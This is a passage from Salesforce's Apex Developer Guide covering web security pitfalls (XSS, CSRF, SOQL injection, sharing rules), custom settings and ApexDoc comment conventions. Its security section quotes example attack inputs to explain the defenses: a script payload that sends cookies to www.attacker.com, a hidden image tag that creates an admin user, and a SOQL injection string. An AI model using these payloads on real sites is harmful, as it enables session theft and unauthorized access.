-[information, see the Lightning Platform Security Resources page on Salesforce Developers. https://developer.salesforce.com/page/Security.](https://developer.salesforce.com/page/Security)
-
-Open Redirects Through Static Resources
-
-URL redirects automatically send a user to a different web page. Redirects are often used to guide navigation to a website, or refer
-multiple domain names belonging to the same owner to refer to a single website. Unfortunately for developers, attackers can exploit
-URL redirects when not implemented properly. Open redirect (also known as “arbitrary redirect”) is a common web application vulnerability
-where values controlled by the user determine where the app redirects.
-
-Warning: Open redirects through static resources can expose users to the risk of unintended, and possibly malicious, redirects.
-
-Only admins with “Customize Application” permissions can upload static resources within an organization. Admins with this permission
-must use caution to ensure that static resources don’t contain malicious content. To learn how to help guard against static resources
-[that were obtained from third parties, see Referencing Untrusted Third-Party Content with iframes .](https://developer.salesforce.com/docs/atlas.en-us.260.0.pages.meta/pages/pages_resources_iframe.htm)
-
-Cross Site Scripting (XSS)
-
-
-Apex Developer Guide Working with Data in Apex
-
-Unescaped Output and Formulas in Visualforce Pages
-When using components that have set the `escape` attribute to false, or when including formulas outside of a Visualforce component,
-output is unfiltered and must be validated for security. This is especially important when using formula expressions.
-
-Cross-Site Request Forgery (CSRF)
-
-SOQL Injection
-
-Data Access Control
-
-###### Cross Site Scripting (XSS)
-
-Cross-site scripting (XSS) attacks are where malicious HTML or client-side scripting is provided to a web application. The web application
-includes malicious scripting in a response to a user who unknowingly becomes the victim of the attack. The attacker uses the web
-application as an intermediary in the attack, taking advantage of the victim's trust for the web application. Most applications that display
-dynamic web pages without properly validating the data are likely to be vulnerable. Attacks against the website are especially easy if
-input from one user is shown to another user. Some obvious possibilities include bulletin board or user comment-style websites, news,
-or email archives.
-
-For example, assume this script is included in a Lightning Platform page using a script component, an `on*` event, or a Visualforce page.
-
-```
-   <script>var foo = '{!$CurrentPage.parameters.userparam}';</script>
-
-```
-
-This script block inserts the value of the user-supplied `userparam` onto the page. The attacker can then enter this value for
-`userparam` .
-
-```
-   1';document.location='http://www.attacker.com/cgi-bin/cookie.cgi?'%2Bdocument.cookie;var%20foo='2
-
-```
-
-In this case, all cookies for the current page are sent to `www.attacker.com` as the query string in the request to the `cookie.cgi`
-script. At this point, the attacker has the victim's session cookie and can connect to the web application as if they were the victim.
-
-The attacker can post a malicious script using a website or email. Web application users not only see the attacker's input, but their
-browser can execute the attacker's script in a trusted context. With this ability, the attacker can perform a wide variety of attacks against
-the victim. These attacks range from simple actions, such as opening and closing windows, to more malicious attacks, such as stealing
-data or session cookies, which allow an attacker full access to the victim's session.
-
-For more information on this type of attack:
-
-**•** [http://www.owasp.org/index.php/Cross_Site_Scripting](http://www.owasp.org/index.php/Cross_Site_Scripting)
-
-**•** [http://www.cgisecurity.com/xss-faq.html](http://www.cgisecurity.com/xss-faq.html)
-
-**•** [http://www.owasp.org/index.php/Testing_for_Cross_site_scripting](http://www.owasp.org/index.php/Testing_for_Cross_site_scripting)
-
-**•** [http://www.google.com/search?q=cross-site+scripting](http://www.google.com/search?q=cross-site+scripting)
-
-Within the Lightning Platform, several anti-XSS defenses are in place. For example, Salesforce has filters that screen out harmful characters
-in most output methods. For the developer using standard classes and output methods, the threats of XSS flaws are largely mitigated.
-But the creative developer can still find ways to intentionally or accidentally bypass the default controls.
-
-Existing Protection
-
-All standard Visualforce components, which start with `<apex>`, have anti-XSS filters in place to screen out harmful characters. For
-example, this code is normally vulnerable to an XSS attack because it takes user-supplied input and outputs it directly back to the user,
-
-
-Apex Developer Guide Working with Data in Apex
-
-but the `<apex:outputText>` tag is XSS-safe. All characters that appear to be HTML tags are converted to their literal form. For
-example, the < character is converted to `&lt;` so that a literal < appears on the user's screen.
-
-```
-   <apex:outputText>
-
-      {!$CurrentPage.parameters.userInput}
-
-   </apex:outputText>
-
-```
-
-Disabling Escape on Visualforce Tags
-
-By default, nearly all Visualforce tags escape the XSS-vulnerable characters. You can disable this behavior by setting the optional attribute
-`escape="false"` . For example, this output is vulnerable to XSS attacks.
-
-```
-   <apex:outputText escape="false" value="{!$CurrentPage.parameters.userInput}" />
-
-```
-
-Programming Items Not Protected from XSS
-
-Custom Javascript code and code within `<apex:includeScript>` components don’t have built-in XSS protections. These items
-allow the developer to customize the page with script commands. It doesn’t makes sense to include anti-XSS filters on commands that
-are intentionally added to a page.
-
-If you write your own JavaScript, the Lightning Platform has no way to protect you. For example, this code is vulnerable to XSS if used
-in JavaScript.
-
-```
-   <script>
-
-      var foo = location.search;
-
-      document.write(foo);
-
-   </script>
-
-```
-
-With the `<apex:includeScript>` Visualforce component, you can include a custom script on a page. Make sure to validate that
-the content is safe and includes no user-supplied data. For example, this snippet is vulnerable because it includes user-supplied input
-as the value of the script text. The value provided by the tag is a URL to the JavaScript to include. If an attacker can supply arbitrary data
-to this parameter as in the example, they’re able to direct the victim to include any JavaScript file from any other website.
-
-```
-   <apex:includeScript value="{!$CurrentPage.parameters.userInput}" />
-
-###### Unescaped Output and Formulas in Visualforce Pages
-
-```
-
-When using components that have set the `escape` attribute to false, or when including formulas outside of a Visualforce component,
-output is unfiltered and must be validated for security. This is especially important when using formula expressions.
-
-Formula expressions can be function calls or include information about platform objects, a user's environment, system environment,
-and the request environment. It’s important to be aware that the output that’s generated by expressions isn’t escaped during rendering.
-Since expressions are rendered on the server, it’s not possible to escape rendered data on the client using JavaScript or other client-side
-technology. This can lead to potentially dangerous situations if the formula expression references non-system data (that is, potentially
-hostile or editable data) and the expression itself is not wrapped in a function to escape the output during rendering.
-
-A common vulnerability is created by rerendering user input on a page. For example,
-
-```
-   <apex:page standardController="Account">
-
-     <apex:form>
-
-      <apex:commandButton rerender="outputIt" value="Update It"/>
-
-      <apex:inputText value="{!myTextField}"/>
-
-     </apex:form>
-
-     <apex:outputPanel id="outputIt">
-
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
-      Value of myTextField is <apex:outputText value="{!myTextField}" escape="false"/>
-
-     </apex:outputPanel>
-
-   </apex:page>
-
-```
-
-The unescaped `{!myTextField}` results in a cross-site scripting vulnerability. For example, if the user enters :
-
-```
-   <script>alert('xss')
-
-```
-
-and clicks **Update It**, the JavaScript is executed. In this case, an alert dialog is displayed, but more malicious uses could be designed.
-
-There are several functions that you can use for escaping potentially insecure strings.
-
-**HTMLENCODE**
-Encodes text and merge field values for use in HTML by replacing characters that are reserved in HTML, such as the greater-than
-sign (>), with HTML entity equivalents, such as `&gt;` .
-
-**JSENCODE**
-Encodes text and merge field values for use in JavaScript by inserting escape characters, such as a backslash (\), before unsafe
-JavaScript characters, such as the apostrophe (').
-
-**JSINHTMLENCODE**
-Encodes text and merge field values for use in JavaScript inside HTML tags by replacing characters that are reserved in HTML with
-HTML entity equivalents and inserting escape characters before unsafe JavaScript characters. `JSINHTMLENCODE(` _**`someValue`**_ `)`
-is a convenience function that is equivalent to `JSENCODE(HTMLENCODE((` _**`someValue`**_ `))` . That is, `JSINHTMLENCODE`
-first encodes _`someValue`_ with `HTMLENCODE`, and then encodes the result with `JSENCODE` .
-
-**URLENCODE**
-Encodes text and merge field values for use in URLs by replacing characters that are illegal in URLs, such as blank spaces, with the
-code that represent those characters as defined in _RFC 3986, Uniform Resource Identifier (URI): Generic Syntax_ . For example, blank
-spaces are replaced with `%20`, and exclamation points are replaced with `%21` .
-
-To use `HTMLENCODE` to secure the previous example, change the `<apex:outputText>` to the following:
-
-```
-   <apex:outputText value=" {!HTMLENCODE(myTextField)}" escape="false"/>
-
-```
-
-If a user enters `<script>alert('xss')` and clicks **Update It**, the JavaScript is not be executed. Instead, the string is encoded
-and the page displays `Value of myTextField is <script>alert('xss')` .
-
-Depending on the placement of the tag and usage of the data, both the characters needing escaping as well as their escaped counterparts
-may vary. For instance, this statement, which copies a Visualforce request parameter into a JavaScript variable:
-
-```
-   <script>var ret = "{!$CurrentPage.parameters.retURL}";</script>
-
-```
-
-requires that any double quote characters in the request parameter be escaped with the URL encoded equivalent of `%22` instead of
-the HTML escaped `"` . Otherwise, the request:
-
-```
-   https://example.com/demo/redirect.html?retURL=%22foo%22%3Balert('xss')%3B%2F%2F
-
-```
-
-results in:
-
-```
-   <script>var ret = "foo";alert('xss');//";</script>
-
-```
-
-When the page loads the JavaScript executes, and the alert is displayed.
-
-In this case, to prevent JavaScript from being executed, use the `JSENCODE` function. For example
-
-```
-   <script>var ret = "{!JSENCODE($CurrentPage.parameters.retURL)}";</script>
-
-```
-
-Formula tags can also be used to include platform object data. Although the data is taken directly from the user's organization, it must
-still be escaped before use to prevent users from executing code in the context of other users (potentially those with higher privilege
-
-
-Apex Developer Guide Working with Data in Apex
-
-levels). While these types of attacks must be performed by users within the same organization, they undermine the organization's user
-roles and reduce the integrity of auditing records. Additionally, many organizations contain data which has been imported from external
-sources and might not have been screened for malicious content.
-
-###### Cross-Site Request Forgery (CSRF) Cross-Site Request Forgery (CSRF) flaws are less a programming mistake and more a lack of a defense. For example, an attacker has a
-
-web page at `www.attacker.com` that could be any web page, including one that provides valuable services or information that
-drives traffic to that site. Somewhere on the attacker's page is an HTML tag that looks like this:
-
-```
-   <img
-
-   src="http://www.yourwebpage.com/yourapplication/createuser?email=attacker@attacker.com&type=admin....."
-
-    height=1 width=1 />
-
-```
-
-In other words, the attacker's page contains a URL that performs an action on your website. If the user is still logged into your web page
-when they visit the attacker's web page, the URL is retrieved and the actions performed. This attack succeeds because the user is still
-authenticated to your web page. This attack is a simple example, and the attacker can get more creative by using scripts to generate
-the callback request or even use CSRF attacks against your AJAX methods.
-
-For more information and traditional defenses:
-
-**•** [http://www.owasp.org/index.php/Cross-Site_Request_Forgery](http://www.owasp.org/index.php/Cross-Site_Request_Forgery)
-
-**•** [http://www.cgisecurity.com/csrf-faq.html](http://www.cgisecurity.com/csrf-faq.html)
-
-**•** [http://shiflett.org/articles/cross-site-request-forgeries](http://shiflett.org/articles/cross-site-request-forgeries)
-
-Within the Lightning Platform, Salesforce implemented an anti-CSRF token to prevent such an attack. Every page includes a random
-string of characters as a hidden form field. Upon the next page load, the application checks the validity of this string of characters and
-doesn’t execute the command unless the value matches the expected value. This feature protects you when using all of the standard
-controllers and methods.
-
-Here again, the developer can bypass the built-in defenses without realizing the risk. For example, a custom controller takes the object
-ID as an input parameter and then uses that input parameter in a SOQL call.
-
-```
-   <apex:page controller="myClass" action="{!init}"</apex:page>
-
-   public class myClass {
-
-     public void init() {
-
-      Id id = ApexPages.currentPage().getParameters().get('id');
-
-      Account obj = [select id, Name FROM Account WHERE id = :id];
-
-      delete obj;
-
-      return ;
-
-     }
-
-   }
-
-```
-
-The developer unknowingly bypassed the anti-CSRF controls by developing their own action method. The `id` parameter is read and
-used in the code. The anti-CSRF token is never read or validated. An attacking web page can send the user to this page by using a CSRF
-attack and providing any value for the `id` parameter.
-
-There are no built-in defenses for such situations, and developers must be cautious about writing pages that act based on a user-supplied
-parameter like the `id` variable in the previous example. A possible work-around is to insert an intermediate confirmation page to make
-sure that the user intended to call the page. Other suggestions include shortening the idle session timeout and educating users to log
-out of their active session and not use their browser to visit other sites while authenticated.
-
-Because of the Salesforce built-in defense against CSRF, your users can encounter an error when multiple Salesforce login pages are
-open. If the user logs in to Salesforce in one tab and then attempts to log in on another, they see this error: The page you submitted was
-invalid for your session. Users can successfully log in by refreshing the login page or by attempting to log in a second time.
-
-
-Apex Developer Guide Working with Data in Apex
-
-###### SOQL Injection
-
-In other programming languages, the previous flaw is known as SQL injection. Apex doesn’t use SQL, but uses its own database query
-language, SOQL. SOQL is simpler and more limited in functionality than SQL. The risks are lower for SOQL injection than for SQL injection,
-but the attacks are nearly identical to traditional SQL injection. SQL/SOQL injection takes user-supplied input and uses those values in
-a dynamic SOQL query. If the input isn’t validated, it can include SOQL commands that effectively modify the SOQL statement and trick
-the application into performing unintended commands.
-
-###### SOQL Injection Vulnerability in Apex
-
-Here’s a simple example of Apex and Visualforce code vulnerable to SOQL injection.
-
-```
-   <apex:page controller="SOQLController" >
-
-      <apex:form>
-
-        <apex:outputText value="Enter Name" />
-
-        <apex:inputText value="{!name}" />
-
-        <apex:commandButton value="Query" action="{!query}“ />
-
-      </apex:form>
-
-   </apex:page>
-
-   public class SOQLController {
-
-      public String name {
-
-        get { return name;}
-
-        set { name = value;}
-
-      }
-
-      public PageReference query() {
-
-        String qryString = 'SELECT Id FROM Contact WHERE ' +
-
-           '(IsDeleted = false and Name like \'%' + name + '%\')';
-
-        List<Contact> queryResult = Database.query(qryString);
-
-        System.debug('query result is ' + queryResult);
-
-        return null;
-
-      }
-
-   }
-
-```
-
-This simple example illustrates the logic. The code is intended to search for contacts that weren’t deleted. The user provides one input
-value called `name` . The value can be anything provided by the user, and it’s never validated. The SOQL query is built dynamically and
-then executed with the `Database.query` method. If the user provides a legitimate value, the statement executes as expected.
-
-```
-   // User supplied value: name = Bob
-
-   // Query string
-
-   SELECT Id FROM Contact WHERE (IsDeleted = false and Name like '%Bob%')
-
-```
-
-But what if the user provides unexpected input, such as:
-
-```
-   // User supplied value for name: test%') OR (Name LIKE '
-
-```
-
-In that case, the query string becomes:
-
-```
-   SELECT Id FROM Contact WHERE (IsDeleted = false AND Name LIKE '%test%') OR (Name LIKE '%')
-
-```
-
-Now the results show all contacts, not just the non-deleted ones. A SOQL Injection flaw can be used to modify the intended logic of any
-vulnerable query.
-
-
-Apex Developer Guide Working with Data in Apex
-
-SOQL Injection Defenses
-
-To prevent a SOQL injection attack, avoid using dynamic SOQL queries. Instead, use static queries and binding variables. The preceding
-vulnerable example can be rewritten using static SOQL.
-
-```
-   public class SOQLController {
-
-      public String name {
-
-        get { return name;}
-
-        set { name = value;}
-
-      }
-
-      public PageReference query() {
-
-        String queryName = '%' + name + '%';
-
-        List<Contact> queryResult = [SELECT Id FROM Contact WHERE
-
-          (IsDeleted = false and Name like :queryName)];
-
-        System.debug('query result is ' + queryResult);
-
-        return null;
-
-      }
-
-   }
-
-```
-
-If you must use dynamic SOQL, use the `escapeSingleQuotes` method to sanitize user-supplied input. This method adds the
-escape character (\) to all single quotation marks in a string that is passed in from a user. The method ensures that all single quotation
-marks are treated as enclosing strings, instead of database commands.
-
-###### Data Access Control
-
-The Lightning Platform makes extensive use of data sharing rules. Each object has permissions and can have sharing settings that users
-can read, create, edit, and delete. These settings are enforced when using all standard controllers.
-
-When using an Apex class, the built-in user permissions and field-level security restrictions aren’t respected during execution. The default
-behavior is that an Apex class can read and update all data. Because these rules aren’t enforced, developers who use Apex must avoid
-inadvertently exposing sensitive data that’s normally hidden behind user permissions, field-level security, or defaults. For example,
-consider this Apex pseudo-code.
-
-```
-   public class customController {
-
-      public void read() {
-
-        Contact contact = [SELECT id FROM Contact WHERE Name = :value];
-
-      }
-
-   }
-
-```
-
-In this case, all contact records are searched, even if the user currently logged in doesn’t have permission to view these records. The
-solution is to use the qualifying keywords `with sharing` when declaring the class:
-
-```
-   public with sharing class customController {
-
-      . . .
-
-   }
-
-```
-
-The `with sharing` keyword directs the platform to use the security sharing permissions of the user currently logged in, rather than
-granting full access to all records.
-
-#### Custom Settings
-
-Custom settings are similar to custom objects. Application developers can create custom sets of data and associate custom data for an
-organization, profile, or specific user. All custom settings data is exposed in the application cache, which enables efficient access without
-the cost of repeated queries to the database. Formula fields, validation rules, flows, Apex, and SOAP API can then use this data.
-
-
-Apex Developer Guide Working with Data in Apex
-
-Warning: Protection only applies to custom settings that are marked protected and installed to a subscriber organization as part
-of a managed package. Otherwise, they are treated as public custom settings and are readable for all profiles, including the guest
-user. Do not store secrets, personally identifying information, or any private data in these settings. Use protected custom settings
-only in managed packages. Outside of a managed package, use named credentials or encrypted custom fields to store secrets like
-OAuth tokens, passwords, and other confidential material.
-
-Note: While custom settings data is included in sandbox copies, it is treated as data for the purposes of Apex test isolation. Apex
-tests must use `SeeAllData=true` to see existing custom settings data in the organization. As a best practice, create the
-required custom settings data in your test setup.
-
-There are two types of custom settings.
-
-**List Custom Settings**
-A type of custom setting that provides a reusable set of static data that can be accessed across your organization. If you use a particular
-set of data frequently within your application, putting that data in a list custom setting streamlines access to it. Data in list settings
-doesn’t vary with profile or user, but is available organization-wide. Examples of list data include two-letter state abbreviations,
-international dialing prefixes, and catalog numbers for products. Because the data is cached, access is low-cost and efficient: you
-don't have to use SOQL queries that count against your governor limits.
-
-**Hierarchy Custom Settings**
-A type of custom setting that uses a built-in hierarchical logic that lets you “personalize” settings for specific profiles or users. The
-hierarchy logic checks the organization, profile, and user settings for the current user and returns the most specific, or “lowest,” value.
-In the hierarchy, settings for an organization are overridden by profile settings, which, in turn, are overridden by user settings.
-
-To get custom setting data set record based on the lowest level fields defined in the hierarchy, use the `[getinstance()](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_custom_settings.htm#apex_System_HierarchyCustomSetting_getInstance)` instance
-method for hierarchy custom settings.
-
-The following examples illustrate how you can use custom settings.
-
-**•** A shipping application requires users to fill in the country codes for international deliveries. By creating a list setting of all country
-codes, users have quick access to this data without needing to query the database.
-
-**•** An application displays a map of account locations, the best route to take, and traffic conditions. This information is useful for sales
-reps, but account executives only want to see account locations. By creating a hierarchy setting with custom checkbox fields for
-route and traffic, you can enable this data for just the “Sales Rep” profile.
-
-You can create a custom setting in the Salesforce user interface: from Setup, enter _`Custom Settings`_ in the Quick Find box, then
-select **Custom Settings** . After creating a custom setting and you’ve added fields, provide data to your custom setting by clicking **Manage**
-from the detail page. Identify each data set with a name.
-
-For example, if you have a custom setting named Foundation_Countries__c with one text field Country_Code__c, your data sets can
-look like the following:
-
-Data Set Name Country Code Field Value
-
-United States USA
-
-Canada CAN
-
-United Kingdom GBR
-
-You can also include a custom setting in a package. The visibility of the custom setting in the package depends on the `Visibility`
-setting.
-
-Note: Only custom settings definitions are included in packages, not data. To include data, you must populate the custom settings
-using Apex code run by the subscribing organization after they’ve installed the package.
-
-
-### Apex Developer Guide Document Your Apex Code
-
-Apex can access both custom setting types—list and hierarchy.
-
-Note: If **Privacy** for a custom setting is `Protected` and the custom setting is contained in a managed package, the subscribing
-organization can’t edit the values or access them using Apex.
-
-Accessing a List Custom Setting
-
-The following example returns a map of custom settings data. The `getAll` method returns values for all custom fields associated with
-the list setting.
-
-```
-   Map< String_dataset_name, CustomSettingName __c> mcs = CustomSettingName __c.getAll();
-
-```
-
-The following example uses the `getValues` method to return all the field values associated with the specified data set. This method
-can be used with both list and hierarchy custom settings, using different parameters.
-
-```
-   CustomSettingName __c mc = CustomSettingName __c.getValues( data_set_name );
-
-```
-
-Accessing a Hierarchy Custom Setting
-
-The following example uses the `getOrgDefaults` method to return the data set values for the organization level:
-
-```
-   CustomSettingName __c mc = CustomSettingName __c.getOrgDefaults();
-
-```
-
-The following example uses the `getInstance` method to return the data set values for the specified profile. The `getInstance`
-method can also be used with a user ID.
-
-```
-   CustomSettingName __c mc = CustomSettingName __c.getInstance( Profile_ID );
-
-```
-
-SEE ALSO:
-
-_Apex Reference Guide_ [: Custom Settings Methods](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_custom_settings.htm)
-
-### Document Your Apex Code
-
-ApexDoc is a standardized comment format that makes it easier for humans, documentation generators, and AI agents to understand
-your codebase. We recommend using ApexDoc comments to facilitate code collaboration and increase long-term code maintainability.
-Based on the JavaDoc standard, ApexDoc provides specifications, such as specialized tags and guidelines, that are tailored to Apex and
-the Salesforce ecosystem.
-
-ApexDoc Comment Structure and Tags
-To promote consistency and parsability, ApexDoc comments have a defined structure and syntax. Each ApexDoc comment consists
-of a main description and a set of block and inline tags that provide information about the documented code element.
-
-Document Apex Constructs and Features
-Apex has unique constructs and platform-specific features that require particular attention in documentation. Use these guidelines
-to document these elements with ApexDoc.
-
-ApexDoc Examples
-See practical examples of ApexDoc comments applied to various Apex constructs.
-
-
-Apex Developer Guide Document Your Apex Code
-
-#### ApexDoc Comment Structure and Tags
-
-To promote consistency and parsability, ApexDoc comments have a defined structure and syntax. Each ApexDoc comment consists of
-a main description and a set of block and inline tags that provide information about the documented code element.
-
-Important: Although the Apex compiler enforces existing Apex comment syntax on page 49, it doesn’t enforce the ApexDoc
-syntax or check comment accuracy in relation to corresponding Apex code.
-
-Basic Comment Format
-
-ApexDoc comments are distinguished from other Apex comments on page 49 by their starting delimiter. Whereas other multiline
-comments demarcate the beginning and end of the comment block with `/*` and `*/`, ApexDoc comments begin with /** and end
-with */.
-
-An ApexDoc comment immediately precedes the class, interface, enum, method, constructor, or property declaration that it documents.
-No other code or comments are between the ApexDoc comment block and the element that it describes.
-
-If an ApexDoc comment spans multiple lines, each subsequent line begins with an asterisk ( `*` ). Documentation parsers ignore the leading
-asterisk and any whitespace that precedes it on the line.
-
-```
-   /**
-
-    * This is a simple ApexDoc comment.
-
-    */
-
-   public with sharing class MyClass {
-
-      //...
-
-   }
-
-```
-
-Main Description
-
-The main description is the first block of text within an ApexDoc comment. It doesn’t have an explicit tag. It provides a concise summary
-of the documented element.
-
-In the main description, first include a one-sentence summary of the element. Documentation generation tools often extract this first
-sentence to use in summary tables or indexes. End the summary sentence with a period.
-
-After the summary sentence, include any additional context about the element. For example, explain pre- or post- conditions, link to
-relevant documents, or describe variable constraints.
-
-Block and Inline Tags
-
-Block tags and inline tags provide structured information about the element.
-
-Use block tags after the main description of the ApexDoc comment. Block tags begin with the `@` symbol followed by the tag name,
-such as `@param`, `@return`, and `@author` . Each block tag appears on a new line, and the information associated with a block tag
-follows the tag name on the same line or subsequent lines.
-
-Use inline tags within the main description or within the description of a block tag. Inline tags also begin with the `@` symbol followed
-by the tag name, but the tags are enclosed in curly braces ( `{@...}` ).
-
-This table provides a comprehensive ApexDoc tag reference.
-
-
-Apex Developer Guide Document Your Apex Code
-
-**Table 3: ApexDoc Tags**
-
-
-Apex Developer Guide Document Your Apex Code
-
-
-Apex Developer Guide Document Your Apex Code
-
-SEE ALSO:
-
-Document Apex Constructs and Features
-
-ApexDoc Examples
-
-
-Apex Developer Guide Document Your Apex Code
-
-#### Document Apex Constructs and Features
-
-Apex has unique constructs and platform-specific features that require particular attention in documentation. Use these guidelines to
-document these elements with ApexDoc.
-
-Classes
-
-When you document an Apex class on page 61, provide a comprehensive overview of the class’s purpose, responsibilities, and key
-characteristics.
-
-In the summary sentence, describe the class’s overall purpose. After the summary sentence, explain the rationale for the class’s sharing
-model on page 89 if it’s not obvious. For example, explain why the class uses `without sharing` for a specific privileged operation.
-We also recommend using tags such as `@author`, `@version`, `@since`, `@see,` and `@group`, which all provide valuable metadata.
-
-Here’s an example ApexDoc comment for the `DataAggregationService` class.
-
-```
-   /**
-
-    * This service class handles critical data aggregation tasks.
-
-    * It operates using 'without sharing' to ensure access to all necessary
-
-    * records for calculation, irrespective of the running user's sharing rules.
-
-    * Care must be taken when calling methods from this class.
-
-    * @author Jane Doe
-
-    * @since 0.1.0
-
-    */
-
-   public without sharing class DataAggregationService {
-
-      //...
-
-   }
-
-```
-
-Interfaces
-
-Apex interfaces on page 81 define a contract for what other classes can do without specifying how they do it. Focus your ApexDoc
-comments on this contract. In the main description, document the interface’s overall purpose and the contract that it defines. Standard
-metadata tags such as `@author`, `@version`, `@since`, and `@see` are also applicable.
-
-Document each method declaration in the interface as a standard method. Clearly explain the method’s expected behavior, parameters,
-and return values. This documentation sets expectations for any class that implements the interface.
-
-For an example of an interface with an ApexDoc comment, see ApexDoc Examples on page 253.
-
-Enums
-
-Enums on page 33 in Apex define an abstract data type with a finite set of named constant values. In the main description, document
-the enum’s purpose and the set of concepts that it represents. You can also use standard tags such as `@author`, `@version`, `@since`,
-and `@see` .
-
-Clarify individual enum constants if their names aren’t self-explanatory. Either describe a constant’s definition in the enum type’s ApexDoc
-main description, or use standard block comments that directly precede the line for the constant.
-
-Apex enums implicitly include methods such as `values()`, `valueOf(String)`, `name()`, and `ordinal()` . These standard
-methods generally don’t require explicit documentation within each specific enum’s ApexDoc comment.
-
-Here’s an example ApexDoc comment for the `Season` enum.
-
-```
-   /**
-
-    * Potential seasons of the year
-
-    */
-
-```
-
-
-Apex Developer Guide Document Your Apex Code
-
-```
-   public enum Season {
-
-     WINTER,
-
-     SPRING,
-
-     SUMMER,
-
-     FALL
-
-   }
-
-```
-
-Methods and Constructors
-
-Method on page 64 and constructor on page 67 documentation is critical for understanding how to use an Apex class.
-
-When you document method and constructor parameters, use the `@param` block tag. Each parameter must have a corresponding
-`@param` tag. In the parameter description, describe the parameter’s name, its purpose, and any expectations regarding its type or
-content. Descriptions can include statements such as “Cannot be null” or “A valid 18-character ID”.
-
-For methods that return values, use the `@return` block tag. In the description, specify what is returned, including conditions for null
-values or specific data structures. Descriptions can include statements such as “A List of Account sObjects matching the filter criteria; an
-empty list if no matches are found.”
-
-Use the `@throws` block tag to list all significant checked and unchecked exceptions that the method can explicitly throw, along with
-the conditions causing them. This documentation is crucial for identifying gaps in error handling.
-
-For examples of methods and constructors with ApexDoc comments, see ApexDoc Examples on page 253.
-
-Properties and Variables
-
-Document public or global properties and class member variables that form part of a class’s public API.
-
-In the ApexDoc comment’s main description section, explain the property’s purpose, its data type if it’s unclear from the method
-declaration, and any important usage notes. For example, include whether the property is read-only after initialization, or its default
-value. Block tags such as `@see`, `@since`, and `@deprecated` can also be applicable.
-
-Here’s an example ApexDoc comment for the public `maxRetries` variable.
-
-```
-   /**
-
-    * Stores the maximum number of retry attempts for an operation.
-
-    * Defaults to 3 if not explicitly set.
-
-    * @since 0.1.1
-
-    */
-
-   public Integer maxRetries {
-
-     get {
-
-      return maxRetries ?? 3;
-
-     }
-
-     set { maxRetries = value; }
-
-   }
-
-```
-
-Triggers
-
-Apex triggers on page 266 are event-driven pieces of code that execute in response to specific database operations. Apex trigger
-definitions provide significant context, so we strongly recommend that you delegate all business logic to a separate handler class or a
-trigger framework. Therefore, ApexDoc doesn’t have any trigger-specific comment specifications.
-
-
-Apex Developer Guide Document Your Apex Code
-
-However, you can still include standard ApexDoc tags such as `@since` and `@see` . For example, here’s a ApexDoc comment for the
-`Opportunity` trigger.
-
-```
-   /**
-
-    * @since 1.3.2
-
-    */
-
-   trigger OpportunityTrigger on Opportunity (
-
-     before insert,
-
-     after insert,
-
-     before update,
-
-     after update,
-
-     before delete,
-
-     after delete,
-
-     after undelete
-
-   ) {
-
-     new OpportunityTriggerHandler().run();
-
-   }
-
-```
-
-Annotations
-
-Apex annotations on page 92, such as `@AuraEnabled` and `@Future`, modify the way a class or method is used by the platform
-and other code. For an element that has an annotation, document the implications of that annotation for the element’s behavior or
-usage.
-
-Refer to this table as you write ApexDoc comments for elements with Apex annotations.
-
-**Table 4: Document Common Apex Annotations**
-
-
-Apex Developer Guide Document Your Apex Code
-
-SEE ALSO:
-
-ApexDoc Comment Structure and Tags
-
-#### ApexDoc Examples ApexDoc Examples
-
-See practical examples of ApexDoc comments applied to various Apex constructs.
-
-Class Example
-
-```
-   /**
-
-    * Manages customer account information and related operations.
-
-    * This class bypasses user record access via 'without sharing' so that it
-
-    * can be used in a batch classes.
-
-    * @author John Developer
-
-    * @since 0.1.0
-
-    * @version 0.3.1
-
-    * @see AccountProcessingBatch
-
-    * @group Account
-
-    * @example
-
-    * {@code
-
-    * Account a;
-
-    * try {
-
-    * a = new AccountManager().createAccount('Acme', 'Agriculture');
-
-    * } catch (AccountManager.AccountException caught) {
-
-    * LOGGER.log(caught);
-
-    * // further exception handling
-
-    * }
-
-    * }
-
-    */
-
-   public without sharing class AccountManager {
-
-      /**
-
-      * The default region for new accounts if not specified.
-
-      */
-
-      public static final String DEFAULT_REGION = 'North America';
-
-```
-
-
-Apex Developer Guide Document Your Apex Code
-
-```
-      /**
-
-      * Stores the count of active accounts managed by this instance.
-
-      * Populated after using the {@link AccountService}.
-
-      */
-
-      @TestVisible
-
-      private Integer activeAccountCount;
-
-      /**
-
-      * Creates a new Account sObject with the given name and industry.
-
-      * @param accountName The desired name for the new account. Cannot be null or empty.
-
-      * @param industry The industry classification for the new account.
-
-      * @return The newly created Account sObject with its ID populated.
-
-      * @throws AccountManager.AccountException if accountName is invalid
-
-      * or if DML operation fails.
-
-      */
-
-      public Account createAccount(String accountName, String industry) {
-
-        if (String.isBlank(accountName)) {
-
-           throw new AccountManager.AccountException('Account name cannot be blank.');
-
-        }
-
-        Account acc = new Account(Name = accountName, Industry = industry);
-
-        // Potentially more logic here
-
-        try {
-
-           insert acc;
-
-        } catch (DmlException e) {
-
-           throw new AccountManager.AccountException(
-
-             'Failed to create account: ' + e.getMessage()
-
-           );
-
-        }
-
-        return acc;
-
-      }
-
-      // more methods...
-
-      /**
-
-      * Represents an exception specific to AccountManager operations.
-
-      * @example
-
-      * {@code
-
-      * throw new AccountManager.AccountException('Account not found with provided Id.');
-
-      * }
-
-      */
-
-      public class AccountException extends Exception {}
-
-   }
-
-```
-
-Packaged Class Example
-
-```
-   /**
-
-    * Provides services for geolocation and address conversion.
-
-    * @author Dennis Smith
-
-    * @version 0.3.0
-
-    * @since 0.1.0
-
-    */
-
-   global with sharing class GeolocationService {
-
-     /**
-
-```
-
-
-Apex Developer Guide Document Your Apex Code
-
-```
-     * Represents geographic coordinates (latitude and longitude).
-
-     */
-
-     global class Coordinates {
-
-      @AuraEnabled
-
-      public Decimal latitude;
-
-      @AuraEnabled
-
-      public Decimal longitude;
-
-      global Coordinates(Decimal lat, Decimal lon) {
-
-       this.latitude = lat;
-
-       this.longitude = lon;
-
-      }
-
-     }
-
-     /**
-
-     * Converts a full address string to approximate latitude
-
-     * and longitude coordinates. This method is deprecated and should no
-
-     * longer be used due to its reliance on an older, less accurate geocoding
-
-     * service and simpler parsing logic. It may not handle all address formats
-
-     * correctly and has a lower success rate.
-
-     * @param fullAddress The complete address string
-
-     * (e.g., "123 Main St, Anytown, CA 90210, USA").
-
-     * @return A `Coordinates` object representing the approximate latitude and longitude.
-
